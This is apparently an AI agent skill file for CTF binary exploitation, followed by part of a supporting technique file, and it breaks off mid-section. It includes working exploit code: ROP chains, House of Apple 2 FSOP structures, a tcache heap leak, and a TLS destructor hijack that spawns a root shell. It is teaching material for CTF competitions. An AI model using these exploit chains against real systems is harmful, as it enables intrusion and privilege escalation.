---
name: ctf-pwn
description: Provides binary exploitation techniques for CTF challenges. Use when you already have a vulnerable native target or service and need to turn memory corruption or low-level primitives into code execution or privilege escalation, such as buffer overflows, format strings, heap bugs, ROP, ret2libc, shellcode, kernel exploitation, seccomp bypass, sandbox escape, or Windows/Linux exploit chains. Do not use it when the main blocker is understanding what the binary does; use reverse engineering first. Do not use it for pure web bugs, disk or packet forensics, or standalone crypto/math challenges.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Binary Exploitation (Pwn)

Quick reference for binary exploitation (pwn) CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install pwntools ropper ROPgadget
```

**Linux (apt):**
```bash
apt install gdb binutils strace ltrace qemu-system-x86
```

**macOS (Homebrew):**
```bash
brew install gdb binutils qemu
```

**Ruby gems (all platforms):**
```bash
gem install one_gadget seccomp-tools
```

**Manual install:**
- pwndbg — Linux: [GitHub](https://github.com/pwndbg/pwndbg), macOS: `brew install pwndbg/tap/pwndbg-gdb`
- checksec — included with pwntools

## Additional Resources

- [overflow-basics.md](overflow-basics.md) - Stack/global buffer overflow, ret2win, canary bypass, canary byte-by-byte brute force on forking servers, struct pointer overwrite, signed integer bypass, hidden gadgets, stride-based OOB read leak, parser stack overflow via unchecked memcpy length with callee-saved register restoration
- [rop-and-shellcode.md](rop-and-shellcode.md) - Core ROP chains (ret2libc, syscall ROP, rdx control, shell interaction), ret2csu, bad character XOR bypass, exotic x86 gadgets (BEXTR/XLAT/STOSB/PEXT), stack pivot via xchg rax,esp, sprintf() gadget chaining for bad character bypass, canary XOR epilogue as RDX zeroing gadget
- [rop-advanced.md](rop-advanced.md) - Advanced ROP techniques: double stack pivot to BSS via leave;ret, SROP (Sigreturn-Oriented Programming) with UTF-8 constraints, seccomp bypass, RETF architecture switch (x64→x32) for seccomp bypass, shellcode with input reversal, .fini_array hijack, ret2vdso, pwntools template, x32 ABI syscall aliasing for seccomp bypass, time-based blind shellcode exfiltration
- [format-string.md](format-string.md) - Format string exploitation (leaks, GOT overwrite, blind pwn, filter bypass, canary leak, __free_hook, .rela.plt patching, saved EBP overwrite for .bss pivot, argv[0] overwrite for stack smash info leak, .fini_array loop for multi-stage exploitation, __printf_chk bypass with sequential %p, single-call leak + GOT overwrite)
- [advanced.md](advanced.md) - Seccomp advanced techniques, UAF, JIT, esoteric GOT, heap overlap via base conversion, tree data structure stack underallocation, ret2dlresolve, kernel exploitation (basic)
- [heap-techniques.md](heap-techniques.md) - House of Apple 2 (+ setcontext SUID variant), House of Einherjar, House of Orange/Spirit/Lore/Force, heap grooming, custom allocators (nginx, talloc), classic unlink, musl libc heap (meta pointer + atexit hijack), tcache stashing unlink attack, UAF vtable pointer encoding shell argument, fastbin stdout vtable two-stage hijack
- [advanced-exploits.md](advanced-exploits.md) - Advanced exploit techniques (part 1): VM signed comparison, BF JIT shellcode, type confusion, off-by-one index corruption, DNS overflow, ASAN shadow memory, format string with encoding constraints, custom canary preservation, signed integer bypass, canary-aware partial overflow, CSV injection, MD5 preimage gadgets, VM GC UAF slab reuse, path traversal sanitizer bypass, FSOP + seccomp bypass via openat/mmap/write
- [advanced-exploits-2.md](advanced-exploits-2.md) - Advanced exploit techniques (part 2): bytecode validator bypass via self-modification, io_uring UAF with SQE injection, integer truncation int32->int16, GC null-reference cascading corruption, leakless libc via multi-fgets stdout FILE overwrite, signed/unsigned char underflow heap overflow, XOR keystream brute-force write primitive, tcache pointer decryption heap leak, unsorted bin promotion via forged chunk size, FSOP stdout TLS leak, TLS destructor hijack via `__call_tls_dtors`, custom shadow stack pointer overflow bypass, signed int overflow negative OOB heap write, XSS-to-binary pwn bridge
- [advanced-exploits-4.md](advanced-exploits-4.md) - Advanced exploit techniques (part 4): Windows SEH overwrite + pushad VirtualAlloc ROP, IAT-relative resolution, detached process shell stability, SeDebugPrivilege SYSTEM escalation, ARM buffer overflow with Thumb shellcode, Forth interpreter system word exploitation, GF(2) Gaussian elimination for multi-pass tcache poisoning, single-bit-flip exploitation primitive (mprotect + iterative code patching), Game of Life shellcode evolution via still-lifes, UAF via menu-driven strdup/free ordering, Windows CFG bypass via system() as valid call target
- [advanced-exploits-3.md](advanced-exploits-3.md) - Advanced exploit techniques (part 3): stack variable overlap / carry corruption OOB, 1-byte overflow via 8-bit loop counter, game AI arithmetic mean OOB read, arbitrary read/write GOT overwrite to shell, stack leak via __environ + memcpy overflow, JIT sandbox escape via uint16 jump truncation, DNS compression pointer stack overflow with multi-question ROP, ELF code signing bypass via program header manipulation, game level format signed/unsigned coordinate mismatch, file descriptor inheritance via missing O_CLOEXEC, sign extension integer underflow in metadata parsing, ROP chain construction with read-only primitive, 4-byte shellcode with timing side-channel via persistent registers, CRC oracle as arbitrary read, UTF-8 case conversion buffer overflow
- [sandbox-escape.md](sandbox-escape.md) - Custom VM exploitation, FUSE/CUSE devices, busybox/restricted shell, shell tricks, process_vm_readv sandbox bypass, named pipe file size bypass (cross-references ctf-misc/pyjails.md for Python jail techniques)
- [kernel.md](kernel.md) - Linux kernel exploitation fundamentals: environment setup, QEMU debug, heap spray structures (tty_struct, poll_list, user_key_payload, seq_operations), kernel stack overflow, canary leak, privilege escalation (ret2usr, kernel ROP), modprobe_path overwrite, core_pattern overwrite, kmalloc size mismatch heap overflow + struct file f_op corruption
- [kernel-techniques.md](kernel-techniques.md) - Kernel exploitation techniques: tty_struct kROP (fake vtable + stack pivot), AAW via ioctl register control, userfaultfd race stabilization, SLUB allocator internals (freelist hardening/obfuscation), leak via kernel panic, MADV_DONTNEED race window extension (DiceCTF 2026), cross-cache CPU-split attack (DiceCTF 2026), PTE overlap file write (DiceCTF 2026)
- [kernel-bypass.md](kernel-bypass.md) - Kernel protection bypass: KASLR/FGKASLR bypass (__ksymtab), KPTI bypass (swapgs trampoline, signal handler, modprobe_path/core_pattern via ROP), SMEP/SMAP bypass, GDB kernel module debugging, initramfs/virtio-9p workflow, exploit templates, exploit delivery

---

## When to Pivot

- If you do not yet understand what the binary does, switch to `/ctf-reverse` before trying to exploit it.
- If the service is really a restricted shell, encoding puzzle, or sandbox language challenge, switch to `/ctf-misc`.
- If the exploit path depends on a web endpoint, session bug, or upload primitive more than memory corruption, switch to `/ctf-web`.
- If the vulnerability requires breaking a cryptographic primitive before exploitation, switch to `/ctf-crypto`.

## Quick Start Commands

```bash
# Binary analysis
checksec --file=binary
file binary
readelf -h binary

# Find gadgets
ROPgadget --binary binary | grep "pop rdi"
ropper -f binary --search "pop rdi"
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Debug
gdb -q binary -ex 'start' -ex 'checksec'

# Pattern for offset finding
python3 -c "from pwn import *; print(cyclic(200))"
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"

# libc identification
./libc-database/find puts <leaked_addr_last_3_nibbles>
```

## Source Code Red Flags

- Threading/`pthread` -> race conditions
- `usleep()`/`sleep()` -> timing windows
- Global variables in multiple threads -> TOCTOU

## Race Condition Exploitation

```bash
bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
```

## Common Vulnerabilities

- Buffer overflow: `gets()`, `scanf("%s")`, `strcpy()`
- Format string: `printf(user_input)`
- Integer overflow, UAF, race conditions

## Protection Implications for Exploit Strategy

| Protection | Status | Implication |
|-----------|--------|-------------|
| PIE | Disabled | All addresses (GOT, PLT, functions) are fixed - direct overwrites work |
| RELRO | Partial | GOT is writable - GOT overwrite attacks possible |
| RELRO | Full | GOT is read-only - need alternative targets (hooks, vtables, return addr) |
| NX | Enabled | Can't execute shellcode on stack/heap - use ROP or ret2win |
| Canary | Present | Stack smash detected - need leak or avoid stack overflow (use heap) |

**Quick decision tree:**
- Partial RELRO + No PIE -> GOT overwrite (easiest, use fixed addresses)
- Full RELRO -> target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
- Stack canary present -> prefer heap-based attacks or leak canary first

## Stack Buffer Overflow

1. Find offset: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite
5. Canary brute-force byte-by-byte on forking servers (7*256 attempts max)

**ret2win with magic value:** Overflow -> `ret` (alignment) -> `pop rdi; ret` -> magic -> win(). **Stack alignment:** SIGSEGV in `movaps` = add extra `ret` gadget. **Offset:** buffer at `rbp - N`, return at `rbp + 8`, total = N + 8. **Input filtering:** assert payload avoids `memmem()` banned strings. **Gadgets:** `ROPgadget --binary binary | grep "pop rdi"`, or pwntools `ROP()` for hidden gadgets in CMP immediates. See [overflow-basics.md](overflow-basics.md) for full exploit code.

## Parser Stack Overflow (Unchecked memcpy)

**Pattern:** Custom file parser (PCAP, image, archive) allocates fixed stack buffer but input records can exceed it. `memcpy` copies before length validation, overflowing saved registers and return address. Must restore callee-saved registers: `rbx` to readable memory (BSS), loop counters to exit values, then `ret` gadget + win function. See [overflow-basics.md](overflow-basics.md#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026).

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu create/modify/delete on structs with data buffer + pointer. Overflow name into pointer field with GOT address, then write win address via modify. See [overflow-basics.md](overflow-basics.md) for full exploit and GOT target selection table.

## Signed Integer Bypass

**Pattern:** `scanf("%d")` without sign check; negative quantity * price = negative total, bypasses balance check. See [overflow-basics.md](overflow-basics.md).

## Canary-Aware Partial Overflow

**Pattern:** Overflow `valid` flag between buffer and canary. Use `./` as no-op path padding for precise length. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit chain.

## Global Buffer Overflow (CSV Injection)

**Pattern:** Adjacent global variables; overflow via extra CSV delimiters changes filename pointer. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit.

## ROP Chain Building

Leak libc via `puts@PLT(puts@GOT)`, return to vuln, stage 2 with `system("/bin/sh")`. See [rop-and-shellcode.md](rop-and-shellcode.md) for full two-stage ret2libc pattern, leak parsing, and return target selection.

**DynELF libc discovery:** `pwntools.DynELF(leak_func, pointer_in_libc)` resolves libc symbols remotely without knowing the libc version. See [rop-and-shellcode.md](rop-and-shellcode.md#dynelf-automated-libc-discovery-rc3-ctf-2016).

**Constrained shellcode in small buffers:** When buffer is too small, use `read()` shellcode stub (< 20 bytes) to pull full stage-2 shellcode. See [rop-and-shellcode.md](rop-and-shellcode.md#constrained-shellcode-in-small-buffers-tum-ctf-2016).

**Raw syscall ROP:** When `system()`/`execve()` crash (CET/IBT), use `pop rax; ret` + `syscall; ret` from libc. See [rop-and-shellcode.md](rop-and-shellcode.md).

**ret2csu:** `__libc_csu_init` gadgets control `rdx`, `rsi`, `edi` and call any GOT function — universal 3-argument call without libc gadgets. See [rop-and-shellcode.md](rop-and-shellcode.md#ret2csu-libccsuinit-gadgets-crypto-cat).

**Bad char XOR bypass:** XOR payload data with key before writing to `.data`, then XOR back in place with ROP gadgets. Avoids null bytes, newlines, and other filtered characters. See [rop-and-shellcode.md](rop-and-shellcode.md#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat).

**Exotic gadgets (BEXTR/XLAT/STOSB/PEXT):** When standard `mov` write gadgets are unavailable, chain obscure x86 instructions for byte-by-byte memory writes. See [rop-and-shellcode.md](rop-and-shellcode.md#exotic-x86-gadgets-bextrxlatstosbpext-crypto-cat).

**Stack pivot (xchg rax,esp):** Swap stack pointer to attacker-controlled heap/buffer when overflow is too small for full ROP chain. Requires `pop rax; ret` to load pivot address first. See [rop-and-shellcode.md](rop-and-shellcode.md#stack-pivot-via-xchg-raxesp-crypto-cat).

**rdx control:** After `puts()`, rdx is clobbered to 1. Use `pop rdx; pop rbx; ret` from libc, or re-enter binary's read setup + stack pivot. See [rop-and-shellcode.md](rop-and-shellcode.md).

**Canary XOR epilogue as rdx zeroing gadget:** When no `pop rdx; ret` exists, jump into the canary check epilogue `xor rdx, fs:28h` -- it zeros RDX when the canary is intact. See [rop-and-shellcode.md](rop-and-shellcode.md#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017).

**Shell interaction:** After `execve`, `sleep(1)` then `sendline(b'cat /flag*')`. See [rop-and-shellcode.md](rop-and-shellcode.md).

## Deep-Dive Notes

Use [field-notes.md](field-notes.md) once you have confirmed the challenge is truly exploitation-heavy.

- Heap and allocator notes: House of Apple, tcache, unsafe unlink, talloc, UAF, FSOP
- Advanced exploit notes: seccomp bypass, ret2vdso, io_uring, integer truncation, ASAN, timing oracles
- Sandbox and hybrid notes: pyjail crossover, busybox escapes, custom VMs, shell tricks, path sanitizers
- Kernel and Windows notes: kernel playbooks, SEH, CFG bypass, privilege escalation
- Historical case notes: older but still reusable CTF exploit patterns


---


# advanced-exploits-2

# CTF Pwn - Advanced Exploit Techniques (Part 2)

## Table of Contents
- [Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)](#bytecode-validator-bypass-via-self-modification-srdnlenctf-2026)
- [io_uring UAF with SQE Injection (ApoorvCTF 2026)](#io_uring-uaf-with-sqe-injection-apoorvctf-2026)
- [Integer Truncation Bypass int32 to int16 (ApoorvCTF 2026)](#integer-truncation-bypass-int32-to-int16-apoorvctf-2026)
- [GC Null-Reference Cascading Corruption (DiceCTF 2026)](#gc-null-reference-cascading-corruption-dicectf-2026)
- [Leakless Libc via Multi-fgets stdout FILE Overwrite (Midnightflag 2026)](#leakless-libc-via-multi-fgets-stdout-file-overwrite-midnightflag-2026)
- [Signed/Unsigned Char Underflow to Heap Overflow + TLS Destructor Hijack (Midnightflag 2026)](#signedunsigned-char-underflow-to-heap-overflow--tls-destructor-hijack-midnightflag-2026)
  - [XOR Cipher Keystream Brute-Force Write Primitive](#xor-cipher-keystream-brute-force-write-primitive)
  - [Tcache Pointer Decryption for Heap Leak](#tcache-pointer-decryption-for-heap-leak)
  - [Forging Chunk Size for Unsorted Bin Promotion (Libc Leak)](#forging-chunk-size-for-unsorted-bin-promotion-libc-leak)
  - [FSOP Stdout Redirection for TLS Segment Leak](#fsop-stdout-redirection-for-tls-segment-leak)
  - [TLS Destructor Overwrite for RCE via `__call_tls_dtors`](#tls-destructor-overwrite-for-rce-via-__call_tls_dtors)
- [Custom Shadow Stack Bypass via Pointer Overflow (Midnight 2026)](#custom-shadow-stack-bypass-via-pointer-overflow-midnight-2026)
- [Signed Int Overflow to Negative OOB Heap Write + XSS-to-Binary Pwn Bridge (Midnight 2026)](#signed-int-overflow-to-negative-oob-heap-write--xss-to-binary-pwn-bridge-midnight-2026)
  - [Heap Primitive: Signed Int Overflow in Index Calculation](#heap-primitive-signed-int-overflow-in-index-calculation)
  - [Full Exploitation Chain](#full-exploitation-chain)
  - [XSS-to-Binary Pwn Bridge](#xss-to-binary-pwn-bridge)

---

## Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)

**Pattern (Registered Stack):** Bytecode validator only checks initial bytes; runtime self-modification converts validated instructions into forbidden ones (e.g., `push fs` → `syscall`).

**Key technique:** `push fs` encodes as `0f a0`, and `syscall` as `0f 05`. The validator accepts `push fs`, but at runtime a preceding `push rbx` overwrites the `a0` byte with `05` on the stack, turning it into `syscall`.

**Exploit structure:**
1. Use `pop` instructions to adjust rsp to a predictable memory bucket (~1/16 probability due to ASLR)
2. Seed specific stack values for `pop sp` instruction (pivots to controlled location)
3. Place `syscall` gadget disguised as `push fs` with self-modifying byte mutation
4. Use `read(0, stage2_buf, size)` syscall to load stage 2
5. Stage 2 contains interactive shell code

```python
code = []
code += [0x59] * 30              # pop rcx x30 → rsp += 0xf0
code += [0x66, 0x5c]             # pop sp → pivot to seeded value
code += [0x50] * 17              # push rax x17 (adjust stack)
code += [0x66, 0x50]             # push ax
code += [0x66, 0x54, 0x66, 0x5b] # push sp; pop bx (rbx = count for read)
code += [0x50] * 66              # push rax x66
code += [0x66, 0x59]             # pop cx
code += [0x53]                   # push rbx → overwrites next byte!
# Following bytes: 0x54 0x5e 0x53 0x5a 0x54 0x0f 0xa0
# After push rbx mutates 0xa0 → 0x05: becomes syscall
code += [0x54, 0x5e, 0x53, 0x5a, 0x54, 0x0f, 0xa0]
```

**Key insight:** Bytecode validators that only check the instruction stream statically are vulnerable to self-modification at runtime. Look for instruction pairs where one byte difference changes the instruction's semantics (e.g., `0f a0` → `0f 05`). Use preceding instructions to write the mutation byte onto the stack/code region.

---

## io_uring UAF with SQE Injection (ApoorvCTF 2026)

**Pattern (Abyss):** Multi-threaded binary with custom slab allocator and io_uring worker thread. A FLUSH operation frees objects but preserves dangling pointers, creating UAF. Type confusion between freed/reallocated objects enables injection of io_uring SQE (Submission Queue Entry) structures.

**Exploitation chain:**
1. Exhaust both slab allocators (fill all slots)
2. Leak PIE base from STATUS response
3. FLUSH frees objects (UAF — pointers remain valid)
4. Allocate different type into freed slots (type confusion via exhausted secondary slab falling back to primary)
5. Write crafted io_uring SQE into reused memory
6. Worker thread submits SQE as-is → `IORING_OP_OPENAT` opens flag file

**io_uring SQE structure for file read:**
```python
import struct

def craft_sqe(pie_base, flag_path_offset=0x6010):
    sqe = bytearray(64)
    struct.pack_into('B', sqe, 0, 0x12)       # opcode = IORING_OP_OPENAT
    struct.pack_into('i', sqe, 4, -100)        # fd = AT_FDCWD
    struct.pack_into('Q', sqe, 16, pie_base + flag_path_offset)  # addr = "/flag.txt"
    return bytes(sqe)
```

**Key insight:** io_uring's kernel-side processing trusts SQE contents from userland shared memory. If an attacker controls the SQE buffer via UAF/type confusion, arbitrary kernel operations (file open, read, write) execute without syscall filtering. XOR-encoded slab freelists add complexity but don't prevent logical UAF when FLUSH clears objects without NULLing all references.

**Detection:** Binary uses `io_uring_setup`/`io_uring_enter` syscalls, custom allocator with FLUSH/cleanup operations, multiple threads sharing memory.

---

## Integer Truncation Bypass int32 to int16 (ApoorvCTF 2026)

**Pattern (Archive):** Input validated as int32 (>= 0), then cast to int16_t for bounds check (<= 3). Values 65534-65535 pass the int32 check but become -2/-1 as int16_t, enabling OOB array access.

```python
# Value 65534: int32=65534 (passes >= 0), int16=-2 (passes <= 3)
# ring_array[-2] reads 16 bytes before array → leaks GOT/PIE pointers
payload = str(65534).encode()  # Sends as positive int, server casts to int16
```

**Dynamic fd capture via `xchg rdi, rax`:**

In Docker/socat environments, `open()` may return fd 4+ instead of 3 (extra inherited fds). Hardcoding fd=3 in ORW ROP chains fails.

```python
# Standard ORW fails in Docker:
# open("/flag.txt") → fd=5 (not 3!)
# read(3, buf, size) → reads wrong fd

# Fix: xchg rdi, rax captures open()'s return value dynamically
rop = ROP(libc)
rop.raw(pop_rdi)
rop.raw(flag_str_addr)
rop.raw(pop_rsi)
rop.raw(0)  # O_RDONLY
rop.raw(libc.sym.open)
rop.raw(libc_base + 0x181fe1)  # xchg rdi, rax; cld; ret
# rdi now holds actual fd from open()
rop.raw(pop_rsi)
rop.raw(buf_addr)
rop.raw(pop_rdx_xor_eax)  # pop rdx; xor eax, eax; ret (dual-purpose!)
rop.raw(0x100)  # rdx = size, eax = 0 (SYS_read)
rop.raw(libc.sym.read)  # read(actual_fd, buf, 0x100)
```

**Key insight:** `xchg rdi, rax; cld; ret` is the critical gadget for containerized ORW — it passes `open()`'s actual return value to `read()` without hardcoding the fd number. The `pop rdx; xor eax, eax; ret` gadget serves double duty: sets rdx for read size AND clears eax to 0 (SYS_read syscall number).

---

## GC Null-Reference Cascading Corruption (DiceCTF 2026)

**Pattern (Garden):** Custom stack-based VM with mark-compact GC. GC's `mark_reachable()` follows null references (ref=0) to address 0 of the managed heap (zeroed reserved area), creating a fake 4-byte object. During compaction, `memmove` copies this fake object first, corrupting adjacent real object headers.

**Exploit chain:**
1. **Cascading memmove** — Set up sacrificial array SAC with `entries[0]=0xFFFF`, large array BIG (196 entries) with `entries[195]=0x00040005`, off-heap object OH
   - Null-ref GC corrupts SAC's header to `{0,0}` (length=0)
   - SAC's entry `0xFFFF` cascades into BIG's header → BIG.length = 0xFFFF (OOB!)
   - BIG's entry `0x00040005` cascades into OH's header → OH stays valid

2. **OOB expansion** — Use BIG's OOB write to set OH.obj_size = 0x10000, giving 256KB OOB access on glibc heap

3. **Libc leak** — Create 70+ extra objects so GC's `ctx.objs` allocation exceeds 0x410 bytes → freed to unsorted bin → `main_arena` pointers readable via OH

4. **House of Apple 2 FSOP** — Build fake FILE in OH's data buffer:
```python
# Fake FILE structure
fake_file = flat({
    0x00: b'$0\x00\x00',             # _flags — system("$0") spawns shell
    0x20: p64(0),                      # _IO_write_base = 0
    0x28: p64(1),                      # _IO_write_ptr = 1 (> write_base)
    0x88: p64(heap_lock_addr),         # _lock (valid writable addr)
    0xa0: p64(wide_data_addr),         # _wide_data
    0xc0: p64(1),                      # _mode = 1 (triggers wide path)
    0xd8: p64(io_wfile_jumps),         # vtable = _IO_wfile_jumps
})
# Fake _IO_wide_data
fake_wide = flat({
    0x18: p64(0),                      # _IO_write_base = 0
    0x30: p64(0),                      # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable_addr),  # _wide_vtable
})
# Fake wide vtable with __doallocate = system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),
})
# Overwrite _IO_list_all to point to fake FILE
```

5. **Trigger** — Program exit → `_IO_flush_all` → fake FILE → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `system("$0")` → shell

**`system("$0")` trick:** `$0` expands to the shell name when run via `system()`. Using `"$0\x00\x00"` as `_flags` means `system(fp)` calls `system("$0")` which spawns a shell.

**Key insight:** Mark-compact GC that follows null references creates controllable corruption. The cascade effect — where one corrupted header causes memmove to misalign subsequent objects — amplifies a small initial corruption into full OOB access. Combined with FSOP, this achieves code execution from a VM-level bug.

**STORE array pattern for VM stack management:** When VM only has DUP/SWAP/DROP/DUP_X1, allocate an array object to hold references (via SET_ELEM_OBJ/GET_ELEM_OBJ), enabling random access to values that would otherwise require complex stack juggling.

---

## Leakless Libc via Multi-fgets stdout FILE Overwrite (Midnightflag 2026)

**Pattern (Eyeless):** No direct libc leak available (no format string, no UAF, no unsorted bin). Construct a fake `stdout` FILE structure on BSS via ROP, then call `fflush(stdout)` to leak a GOT entry containing a libc address.

**The null byte problem:** `fgets` appends `\x00` after reading. Libc pointers are 6 bytes + 2 null MSBs (`0x00007f...`). Writing an 8-byte pointer via `fgets` corrupts the byte after it with `\x00`. Directly writing adjacent FILE struct fields is impossible without corruption.

**Multi-fgets solution:** Chain multiple `fgets(addr, 7, stdin)` calls, each writing 7 bytes. The null byte from each `fgets` lands on the next field's null MSB (harmless for libc pointers):

```python
# Build ROP chain that calls fgets multiple times to construct stdout on BSS
# Each call writes 7 bytes; null byte falls on canonical address's 0x00 MSB
FAKE_STDOUT = BSS + 0x800

# Write _flags field
rop += fgets_call(FAKE_STDOUT, 7)      # write 0xfbad2087 + padding
# Write _IO_write_base = GOT address (the value to leak)
rop += fgets_call(FAKE_STDOUT + 0x20, 7)  # write &fflush@GOT
# Write _IO_write_end = GOT address + 8 (controls how many bytes leak)
rop += fgets_call(FAKE_STDOUT + 0x28, 7)  # write &fflush@GOT + 8
# ... (zero-fill remaining fields via earlier memset or BSS zeroes)

# Overwrite stdout pointer and flush
rop += flat(POP_RDI, FAKE_STDOUT)
rop += flat(elf.plt['fflush'])  # fflush(fake_stdout) → writes GOT content
```

**Receiving the leak:**
```python
# fflush writes 8 bytes from _IO_write_base to _IO_write_end
leak = u64(p.recv(8))
libc_base = leak - libc.sym.fflush
```

**Key insight:** `fgets` always appends `\x00`, but libc addresses already end with `\x00\x00` in their two MSBs. Writing in 7-byte chunks means the appended null overwrites a byte that is already null. This enables constructing complex structures (FILE, vtables) in BSS without a prior libc leak.

**When to use:** Binary has `fgets` or similar input function in PLT, a writable BSS/data region, but no existing leak primitive. Requires ROP control (stack pivot) to chain the multiple `fgets` calls.

---

## Signed/Unsigned Char Underflow to Heap Overflow + TLS Destructor Hijack (Midnightflag 2026)

**Pattern (heapn⊕te-ic):** Message structure stores size as `signed char` but encryption/display casts to `unsigned char`. Passing `size = -112` stores as `char(-112)`, but `(unsigned char)(-112) = 144`. With a 127-byte buffer, this gives a 17-byte heap overflow.

**Key insight:** The signed/unsigned char mismatch is a single-byte integer type — unlike int32→int16 truncation, this exploits the implicit promotion from `char` to `unsigned char` in C, common when size fields use `char` instead of `size_t`.

### XOR Cipher Keystream Brute-Force Write Primitive

The challenge uses a deterministic XOR cipher with djb2 hash chain as keystream:

```python
def hash_string(s):
    h = 5381
    for c in s:
        h = (((h << 5) + h) + c) & 0xFFFFFFFFFFFFFFFF
    return h

def get_keystream_byte(seed, x):
    h = hash_string(str(seed).encode())
    for _ in range(x // 8):
        h = hash_string(str(h).encode())
    return p64(h)[x % 8]

def brute_seed(x, target_byte):
    for seed in range(0xFFFFFFFF):
        if get_keystream_byte(seed, x) == target_byte:
            return seed
```

**Key insight:** Deterministic keystream from a brute-forceable seed space enables targeted byte writes via XOR. Each byte position requires finding a seed that produces the desired keystream byte, then XORing with plaintext to write exactly that byte.

**Byte-by-byte write primitive:**
```python
def write_byte(pos, target_byte, idx, leak=False):
    add(underflow(pos), b"A", brute_seed(pos, target_byte))
    if leak:
        data = view(idx)
    delete(idx)
    add(underflow(pos+1), b"A", brute_seed(pos, target_byte))
    delete(idx)
    return data

def overflow_write(offset, payload, idx):
    for i, byte in enumerate(payload):
        write_byte(offset + i, byte, idx)
```

### Tcache Pointer Decryption for Heap Leak

Allocate two chunks, free in LIFO order. The mangled tcache `fd` pointer (glibc 2.32+ safe-linking) stored in the freed chunk can be decoded:

```python
# fd is mangled: fd = ptr ^ (chunk_addr >> 12)
# When first tcache entry points to NULL (second free):
# fd = 0 ^ (chunk_addr >> 12) = chunk_addr >> 12
# Shift left to recover: heap_addr = fd_pointer << 12
heap_leak = u64(leaked_fd) << 12
```

**Key insight:** The first entry in a tcache bin has `fd = NULL ^ (addr >> 12)`, so `fd << 12` directly yields the heap base region. No brute-force needed.

### Forging Chunk Size for Unsorted Bin Promotion (Libc Leak)

To get a libc leak from tcache-sized chunks, forge the next chunk's size header to ≥0x420 (minimum for unsorted bin):

```python
# Overwrite adjacent chunk's size field to 0x431
overflow_write(size_offset, p64(0x431), chunk_idx)
# Ensure fake next_chunk passes: next_chunk.size & PREV_INUSE set
# next_chunk + 0x431 must point to a region with valid size field
# Free the forged chunk → pushed to unsorted bin
# fd/bk now point to main_arena+96
libc_base = u64(leaked_fd) - 0x203b20  # offset to main_arena+96
```

**Key insight:** Any chunk can be promoted to unsorted bin by forging its size ≥0x420. The consistency check requires that `chunk_at_offset(p, size)->size` has `PREV_INUSE` set and is reasonable. Pre-place valid metadata at that boundary.

### FSOP Stdout Redirection for TLS Segment Leak

Tcache poison toward `_IO_2_1_stdout_ - 0x20` to craft a fake FILE structure that leaks the TLS segment address:

```python
# Poison tcache to allocate at _IO_2_1_stdout_ - 0x20
# Craft fake FILE with _IO_write_base pointing to TLS area
# When stdout flushes, it writes from _IO_write_base to _IO_write_ptr
# Scan output for address ending in 0x...740 (TLS alignment pattern)
# TLS mangle cookie is at tls_addr + 0x30
```

**Key insight:** Redirecting `_IO_write_base` of stdout leaks arbitrary memory on the next write. TLS addresses have recognizable alignment patterns — scan the leaked data for them.

### TLS Destructor Overwrite for RCE via `__call_tls_dtors`

The TLS destructor list (`__tls_dtor_list`) contains entries with function pointers mangled using the pointer guard (stored in TLS). Overwriting this list with crafted entries achieves RCE:

```python
def rol(val, bits, width=64):
    return ((val << bits) | (val >> (width - bits))) & ((1 << width) - 1)

# Mangle function pointers with leaked pointer guard
pointer_guard = tls_leak  # from stdout FSOP leak
encoded_setuid = rol(libc.sym.setuid ^ pointer_guard, 0x11)
encoded_system = rol(libc.sym.system ^ pointer_guard, 0x11)

# Craft TLS destructor list node
# struct dtor_list { dtor_func func; void *obj; struct dtor_list *next; }
node1 = p64(0) * 2           # padding
node1 += p64(0x111)          # fake chunk size
node1 += p64(encoded_setuid) # func = setuid(0)
node1 += p64(0)              # obj = 0 (root)
node1 += p64(heap_addr + node2_offset) * 2  # next → node2

node2 = p64(encoded_system)  # func = system("/bin/sh")
node2 += p64(binsh_addr)     # obj = "/bin/sh"
node2 += p64(0)              # next = NULL (end of list)
```

**Full chain:** integer underflow → heap overflow → tcache leak → unsorted bin libc leak → FSOP stdout TLS leak → pointer guard recovery → `__call_tls_dtors` hijack → `setuid(0)` + `system("/bin/sh")`.

**Key insight:** `__call_tls_dtors` iterates a singly-linked list calling `PTR_DEMANGLE(func)(obj)` for each entry. Demangling is `ror(val, 0x11) ^ pointer_guard`. To encode: `rol(target ^ pointer_guard, 0x11)`. The pointer guard lives in TLS at a fixed offset — once leaked via FSOP stdout, the entire list is forgeable.

**When to use:** Modern glibc (2.34+) where `__free_hook`/`__malloc_hook` are removed and FSOP via `_IO_wfile_jumps` (House of Apple 2) is blocked or constrained. TLS destructor overwrite is an alternative exit-time code execution path.

---

## Custom Shadow Stack Bypass via Pointer Overflow (Midnight 2026)

**Pattern (Revenant):** Binary implements a userland shadow stack in `.bss` — each function call pushes the return address to both the hardware stack and a `shadow_stack[]` array, validating them on return. The `shadow_stack_ptr` index increments on every call but is **never bounds-checked**, allowing it to overflow past the array into adjacent `.bss` variables.

**Binary protections:**
- Full RELRO, NX enabled, **PIE disabled** (fixed addresses)
- SHSTK and IBT enabled (Intel CET — hardware shadow stack)
- No stack canary

**`.bss` memory layout:**
```text
0x406000: shadow_stack[512]   (512 × 8 = 4096 bytes)
0x407000: username[16]        (user-controlled via input)
0x407040: shadow_stack_ptr    (index into shadow_stack)
0x407048: shadow_stack_base
```

**Exploitation strategy:**
